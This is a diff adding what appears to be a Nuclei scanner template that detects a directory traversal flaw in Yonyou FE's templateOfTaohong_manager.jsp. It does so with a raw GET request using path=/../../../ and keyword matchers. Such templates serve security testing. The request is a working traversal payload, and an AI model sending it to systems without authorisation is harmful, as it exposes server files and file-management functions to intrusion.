@@ -1,0 +1,28 @@
+id: yonyou-fe-templateofTaohong-manager-dtraversal
+info:
+  name: Yonyou FE "templateOfTaohong_manager.jsp" Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Lower versions of the UFIDA FE platform have a directory traversal vulnerability in the `templateOfTaohong_manager.jsp` file. Attackers can exploit this to traverse system files, obtain sensitive information, and leverage page functionalities to create folders or delete files.
+  tags: directory-traversal
+  reference:
+    - https://blog.csdn.net/qq_41617034/article/details/124268004
+    - https://www.yonyou.com
+http:
+  - raw:
+      - |
+        GET /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "deletefile"
+          - "downloadfile"
+          - "uploadfile"
+          - "backfolder"
+        condition: and
